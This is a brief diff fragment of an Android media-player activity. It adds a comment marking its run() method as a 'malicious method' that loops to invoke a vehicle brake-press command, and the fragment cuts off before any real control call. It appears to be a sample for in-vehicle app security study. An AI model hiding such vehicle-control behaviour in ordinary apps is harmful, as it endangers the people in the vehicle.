@@ -60,13 +60,11 @@ public class MainActivity extends AppCompatActivity implements Runnable{
                 mediaPlayer.pause();
             }
         });
-
-//hi
     }
 
     @Override
     public void run() {
-
+        //MALICIOUS METHOD that will invoke a brake pressing command 
         while(true){
             Log.w(LOG_TAG, "Vehicle.brake.press()");
             try {
